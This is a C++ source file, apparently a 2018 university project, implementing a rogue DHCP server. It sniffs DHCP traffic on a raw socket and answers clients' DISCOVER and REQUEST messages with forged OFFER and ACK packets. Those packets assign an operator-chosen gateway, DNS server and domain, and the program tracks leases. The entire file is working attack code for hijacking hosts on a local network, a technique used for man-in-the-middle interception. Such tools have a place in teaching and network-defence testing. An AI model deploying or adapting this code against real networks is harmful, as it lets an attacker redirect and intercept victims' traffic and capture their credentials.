/*
 * File: rogue.cpp
 * Date: 21.4.2018
 * Name: Rogue DHCP Server, PDS project
 * Author: Patrik Segedy <xseged00@vutbr.cz>
 * Description: Rogue DHCP Server
 */

#include "checksum.h"
#include "rogue.h"

int sd = -1; // socket descriptor
using namespace std;


int main(int argc, char **argv) {
    signal(SIGINT, handleSignal);

    params p;
    struct sockaddr_ll sa;
    struct sockaddr_ll client;
    socklen_t length = sizeof(client);
    int rc;

    char frame[PKT_LEN];
    struct ether_header *eh = (struct ether_header *)frame;
    struct ip *ip_h = (struct ip *) (frame + sizeof(struct ether_header));
    struct udphdr *udp_h = (struct udphdr *) (((char *) ip_h) + sizeof(struct ip));
    dhcp_packet *dhcp = (dhcp_packet *) (((char *) udp_h) + sizeof(udphdr));

    LeaseVector leases;

    // create RAW UDP socket
    if ((sd = socket(PF_PACKET, SOCK_RAW, IPPROTO_UDP)) < 0) {
        cerr << "ERROR: Failed to create socket" << endl;
        return EXIT_FAILURE;
    }

    if (get_args(argc, argv, &p) == 1)
        return EXIT_FAILURE;

    cout << "iface: " << p.if_name << endl;
    cout << "if_idx: " << p.if_idx << endl;

    cout << "MAC: ";
    for (int i = 0; i < 6; ++i) {
        cout << hex << (int)p.mac[i] << dec << ":";
    }
    cout << endl;
    cout << "IP: " << inet_ntoa(*(struct in_addr *)&p.ip_addr) << endl;
    cout << "Mask: " << inet_ntoa(*(struct in_addr *)&p.mask) << endl;
    cout << "Gateway: " << inet_ntoa(*(struct in_addr *)&p.gate) << endl;
    cout << "DNS: " << inet_ntoa(*(struct in_addr *)&p.ns) << endl;
    cout << "Domain: " << p.domain << endl;
    cout << "Lease: " << ntohl(p.lease_s) << endl;

    // set sockaddr structure
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = p.if_idx;
    sa.sll_halen = ETH_ALEN;
    sa.sll_protocol = htons(ETH_P_ALL);
    memset(sa.sll_addr, -1, ETHER_ADDR_LEN);

    // int on = 1;
    // setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));

    // bind according to sockaddr struct
    if (bind(sd, (struct sockaddr*) &sa, sizeof(sa)) < 0) {
        cerr << "ERROR: Failed to bind" << endl;
        close(sd);
        return EXIT_FAILURE;
    }

    uint32_t offered_addr = 0;
    // get incoming pacets
    while ((rc = recvfrom(sd, &frame, sizeof(frame), 0, (struct sockaddr *)&client, &length)) >= 0) {
        uint32_t dst_addr = INADDR_BROADCAST;
        int len = 0;
        del_expired(leases, &p);
        int message = get_message_type(dhcp);

        if (message == DHCPDISCOVER) {
            if (dhcp->ciaddr != 0)
                dst_addr = dhcp->ciaddr;
            offered_addr = fill_dhcp(message, dhcp, &p, &sa, offered_addr, leases, &len);
            udp_header(udp_h, &len);
            ip_header(ip_h, dst_addr, &len);
            eth_header(eh, p.mac, dhcp->chaddr, &len);
            if (sendto(sd, frame, len, 0, (sockaddr *)&sa, sizeof(struct sockaddr_ll)) < 0)
                cerr << "ERROR: sending OFFER" << endl;
        }
        else if (message == DHCPREQUEST) {
            if (dhcp->ciaddr != 0) {
                dst_addr = htonl(dhcp->ciaddr);
                fill_dhcp(message, dhcp, &p, &sa, dhcp->ciaddr, leases, &len);
            }
            if (offered_addr != 0) {
                fill_dhcp(message, dhcp, &p, &sa, offered_addr, leases, &len);
            }
            udp_header(udp_h, &len);
            ip_header(ip_h, dst_addr, &len);
            eth_header(eh, p.mac, dhcp->chaddr, &len);
            if (sendto(sd, frame, len, 0, (sockaddr *)&sa, sizeof(struct sockaddr_ll)) < 0)
                cerr << "ERROR: sending ACK" << endl;
            offered_addr = 0;
        }
        else if (message == DHCPRELEASE) {
            // delete address from leases
            array<u_char, 16> client_mac;
            memcpy(client_mac.data(), dhcp->chaddr, 16);
            del_by_mac(leases, &p, 0, client_mac);
        }
    }

    close(sd);
    return 0;
}

int get_args(int argc, char **argv, params *p) {
    int index;
    int c;

    string pool;
    string delim("-");
    size_t found;
    uint32_t first_addr;
    uint32_t last_addr;
    struct ifreq if_ifc;

    if (argc != 13) {
        cerr << "Wrong number of arguments" << endl;
        usage();
        return 1;
    }

    while ((c = getopt (argc, argv, "i:p:g:n:d:l:")) != -1)
        switch (c) {
            case 'i':
                p->if_name = optarg;
                memset(&if_ifc, 0, sizeof(struct ifreq));
                strncpy(if_ifc.ifr_name, optarg, IFNAMSIZ-1);
                cout << "ifr_name: " << if_ifc.ifr_name << endl;
                if (ioctl(sd, SIOCGIFINDEX, &if_ifc) < 0)
                    cerr << "ERROR in SIOCGIFINDEX" << endl;
                p->if_idx = if_ifc.ifr_ifindex;

                if_ifc.ifr_addr.sa_family = AF_INET;
                if (ioctl(sd, SIOCGIFADDR, &if_ifc) < 0)
                    cerr << "ERROR in SIOCGIFADDR" << endl;
                p->ip_addr = ((struct sockaddr_in *)&if_ifc.ifr_addr)->sin_addr.s_addr;

                if (ioctl(sd, SIOCGIFNETMASK, &if_ifc) < 0)
                    cerr << "ERROR in SIOCGIFNETMASK" << endl;
                p->mask = ((struct sockaddr_in *)&if_ifc.ifr_netmask)->sin_addr.s_addr;

                if (ioctl(sd, SIOCGIFHWADDR, &if_ifc) < 0)
                    cerr << "ERROR in SIOCGIFHWADDR" << endl;
                memcpy(p->mac, if_ifc.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);
                break;
            case 'p':
                pool = optarg;
                found = pool.find(delim);
                if (found != string::npos) {
                    first_addr = inet_addr(pool.substr(0, found).c_str());
                    last_addr = inet_addr(pool.erase(0, (found + delim.length())).c_str());
                    if ((int)first_addr == -1 || (int)last_addr == -1) {
                        cerr << "Invalid IP address" << endl;
                        usage();
                        return 1;
                    }
                    for (uint32_t i = first_addr; i <= last_addr; i += htonl(1)) {
                        p->pool.push_back(i);
                    }
                }
                else {
                    usage();
                    return 1;
                }
                break;
            case 'g':
                p->gate = inet_addr(optarg);
                break;
            case 'n':
                p->ns = inet_addr(optarg);
                break;
            case 'd':
                p->domain = optarg;
                break;
            case 'l':
                p->lease_s = htonl(atoi(optarg));
                break;
            case '?':
                cerr << "Bad program arguments" << endl;
                usage();
                return 1;
            default:
                abort();
        }

    for (index = optind; index < argc; index++) {
        cerr << "Non-option argument" << argv[index] << endl;
        usage();
        return 1;
    }


    return 0;
}

uint32_t fill_dhcp(int message_type, dhcp_packet *dhcp, params *p, struct sockaddr_ll *sa, uint32_t offered_addr, LeaseVector &leases, int *len) {
    int on = 0;
    uint32_t addr = 0;

    if (dhcp->flags == BROADCAST_BIT) {  // send as broadcast
        on = 1;
        memset(sa->sll_addr, -1, ETHER_ADDR_LEN);
    }
    else            // send to client's HW address
        memcpy(sa->sll_addr, dhcp->chaddr, ETHER_ADDR_LEN);

    setsockopt(sd, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on));

    //set dhcp packet options
    dhcp->op = BOOTREPLY;

    if (message_type == DHCPDISCOVER) {
        message_type = DHCPOFFER;
        if (p->pool.size() < 1) {
            cerr << "Warn: No free leases" << endl;
        }
        addr = p->pool.front();   //give client first address of pool
        p->pool.erase(p->pool.begin());    //delete first address from pool

        memcpy(&(dhcp->yiaddr), &addr, 4);
    }
    else {  // REQUEST
        message_type = DHCPACK;
        memcpy(&(dhcp->yiaddr), &offered_addr, 4);
    }
    memcpy(&(dhcp->siaddr), &(p->ip_addr), 4);\

    memset(dhcp->options, 0, strlen(reinterpret_cast<const char *>(dhcp->options)));
    //dhcp message type
    dhcp->options[0] = 53;
    dhcp->options[1] = 1;
    dhcp->options[2] = message_type;
    //lease time
    dhcp->options[3] = 51;
    dhcp->options[4] = 4;
    memcpy(&(dhcp->options[5]), &(p->lease_s), 4);
    //server identifier
    dhcp->options[9] = 54;
    dhcp->options[10] = 4;
    memcpy(&(dhcp->options[11]), &(p->ip_addr), 4);
    // DNS
    dhcp->options[15] = 6;
    dhcp->options[16] = 4;
    memcpy(&(dhcp->options[17]), &(p->ns), 4);
    //subnet mask
    dhcp->options[21] = 1;
    dhcp->options[22] = 4;
    memcpy(&(dhcp->options[23]), &(p->mask), 4);
    // Router option
    dhcp->options[27] = 3;
    dhcp->options[28] = 4;
    memcpy(&(dhcp->options[29]), &(p->gate), 4);
    // domain
    int domain_len = p->domain.size();
    dhcp->options[33] = 15;
    dhcp->options[34] = domain_len;
    memcpy(&(dhcp->options[35]), p->domain.c_str(), domain_len);
    //end
    dhcp->options[35+domain_len] = 255;

    // packet length
    *len += 35 + domain_len + 240;

    // update leases
    if (message_type == DHCPACK) {
        // start and end of lease
        time_t t_start = time(nullptr);
        time_t t_end = time(nullptr) + ntohl(p->lease_s);
        array<u_char, 16> client_mac;
        memcpy(client_mac.data(), dhcp->chaddr, 16);

        del_by_mac(leases, p, dhcp->yiaddr, client_mac);
        // store values to lease vector
        leases.emplace_back(client_mac, offered_addr, t_start, t_end);
    }

    return addr;
}

void del_by_mac(LeaseVector &lease, params *p, uint32_t yiaddr, array<u_char, 16> &client_mac) {
    uint32_t addr;
    LeaseVector to_del;
    to_del.clear();

    for(auto i = lease.begin(); i != lease.end(); ++i) {
        if (get<0>(*i) == client_mac) {
            addr = get<1>(*i);
            if (yiaddr != addr)
                p->pool.push_back(addr);
            to_del.push_back(*i);
        }
    }
    for (auto i = to_del.begin(); i != to_del.end(); ++i)
        // delete all marked leases
        lease.erase(remove(lease.begin(), lease.end(), *i), lease.end());
}

void del_expired(LeaseVector &lease, params *p) {
    time_t now = time(nullptr);
    LeaseVector to_del;
    to_del.clear();
    for(auto i = lease.begin(); i != lease.end(); ++i) {
        if (now > get<3>(*i)) {
            to_del.push_back(*i);
            p->pool.push_back(get<1>(*i));
        }
    }
    for (auto i = to_del.begin(); i != to_del.end(); ++i) {
        // delete expired leases
        lease.erase(remove(lease.begin(), lease.end(), *i), lease.end());
    }
}

int get_message_type(dhcp_packet *dhcp) {
    for (int i = 0; dhcp->options[i] != 255; i++) {
        // if option is DHCP message type
        if (dhcp->options[i] == 53 && dhcp->options[i+1] == 1)
            if (dhcp->options[i+2] > 0 && dhcp->options[i+2] < 8)
                return dhcp->options[i+2];
    }
    return -1;
}

void udp_header(struct udphdr *udp_h, int *len) {
    *len += sizeof(struct udphdr) + 1;
    udp_h->uh_sport = htons(SERVER_PORT);
    udp_h->uh_dport = htons(CLIENT_PORT);
    udp_h->uh_ulen = htons(*len);
    udp_h->uh_sum = 0;
}

void ip_header(struct ip *ip_h, uint32_t dst_addr, int *len) {
    *len += sizeof(struct ip);
    ip_h->ip_hl = 5;
    ip_h->ip_v = 4;
    ip_h->ip_tos = 0x10;
    ip_h->ip_len = htons(*len);
    ip_h->ip_id = htons(0xffff);
    ip_h->ip_ttl = 64; // hops
    ip_h->ip_p = IPPROTO_UDP;
    ip_h->ip_src.s_addr = htonl(INADDR_ANY);
    ip_h->ip_dst.s_addr = htonl(dst_addr);
    ip_h->ip_sum = 0;
    ip_h->ip_sum = in_cksum((unsigned short *) ip_h, sizeof(struct ip));
}

void eth_header(struct ether_header *eh, uint8_t *src_mac, uint8_t *dst_mac, int *len) {
    *len += sizeof(struct ether_header);
    memcpy(eh->ether_shost, src_mac, ETHER_ADDR_LEN);
    memcpy(eh->ether_dhost, dst_mac,  ETHER_ADDR_LEN);
    eh->ether_type = htons(ETHERTYPE_IP);
}

void handleSignal(int signal) {
    if (sd != -1)
        close(sd);
    exit(signal);
}

void usage() {
    cout << "Usage:" << endl
         << "./pds-dhcprogue -i interface -p pool -g gateway -n dns-server -d domain -l lease-time" << endl << endl
         << "Parameters" << endl
         << "\t-i <interface>               Interface name" << endl
         << "\t-p <ip_address>-<ip_address> IP address range" << endl
         << "\t-g <ip_addresses>            gateway IP address" << endl
         << "\t-n <ip_addresses>            IP address of DNS server" << endl
         << "\t-d <domain_name>             Domani name" << endl
         << "\t-l <lease_time>              Lease time in seconds" << endl;
}
